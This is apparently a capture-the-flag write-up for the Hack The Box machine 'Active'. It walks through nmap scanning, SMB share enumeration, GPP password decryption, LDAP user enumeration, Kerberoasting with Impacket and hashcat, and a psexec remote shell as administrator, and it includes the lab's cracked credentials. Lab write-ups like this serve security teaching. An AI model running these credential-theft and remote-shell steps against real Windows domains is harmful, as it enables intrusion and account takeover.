## Port Scanning

A basic TCP scan is run to identify the open ports on the target:

```bash
nmap <IP> -Pn -sT --open --stats-every=5s --reason -oN scan_active.txt
```

![Open ports scan](/assets/images/active/149-1.png)
*Open ports scan*

To extract just the open port numbers:

```bash
grep 'open' scan_active.txt | awk '{print $1}' | cut -d'/' -f1
```

And to enumerate them as a comma-separated list for more specific scans:

```bash
grep 'open' scan_active.txt | awk '{print $1}' | cut -d'/' -f1 | paste -sd ','
```

Using these open ports, it is possible to perform service enumeration with version detection and NSE scripts.

![Service enumeration](/assets/images/active/149-2.png)
*Service enumeration*

UDP ports are also checked for SNMP and other common services.

![UDP ports scan](/assets/images/active/149-3.png)
*UDP ports scan*

## Windows SMB Enumeration

This target is a Windows machine, so SMB could reveal sensitive information. Starting with **enum4linux**:

![enum4linux output](/assets/images/active/149-4.png)
*enum4linux output*

![enum4linux details](/assets/images/active/149-5.png)
*enum4linux details*

Known users include **administrator, guest, krbtgt, domain admins, root**. The SMB share **Replication** is readable.

```bash
smbmap -H 10.10.10.100
```

![SMB share enumeration](/assets/images/active/149-6.png)
*SMB share enumeration*

To recursively view contents:

![Recursive SMB enumeration](/assets/images/active/149-7.png)

## Decrypting GPP Password

The cpassword is a Group Policy Preference password, which **gpp-decrypt** reveals:

![Decrypted password](/assets/images/active/149-9.png)
*Decrypted password*

Now having credentials: **active.htb\SVC_TGS:GPPstillStandingStrong2k18**

## Access Users Folder

```bash
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
```

![SMB map Users folder](/assets/images/active/149-10.png)
*SMB map Users folder*

**smbclient** is used to retrieve files and read the **user.txt** flag:

```bash
smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
```

![SMB client access](/assets/images/active/149-11.png)
*SMB client access*

![user.txt flag](/assets/images/active/149-12.png)

## Active Directory Enumeration

LDAP queries are then used to enumerate domain users:

```bash
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
```

Alternatively, Impacket’s **GetADUsers** can simplify domain user enumeration:

```bash
impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100
```

## Kerberoasting Attack

Service accounts are targeted for Kerberoasting, extracting their service tickets to crack offline:

```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```

Cracking the hash offline using **hashcat** gives the administrator password:

```bash
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```

![Cracked admin password](/assets/images/active/149-13.png)
*Cracked admin password*

## Accessing Administrator Shares

With the admin credentials, all SMB shares are enumerated:

```bash
smbmap -H 10.10.10.100 -d active.htb -u administrator -p Ticketmaster1968
```

![Admin SMB enumeration](/assets/images/active/149-14.png)
*Admin SMB enumeration*

Connecting via **smbclient** retrieves the **root_flag.txt**:

```bash
smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
```

With write access and administrative privileges, it is possible to also obtain a remote shell using **Impacket’s psexec**:

```bash
impacket-psexec active.htb/administrator@10.10.10.100
```

![Remote shell via psexec](/assets/images/active/149-15.png)
*Remote shell via psexec*
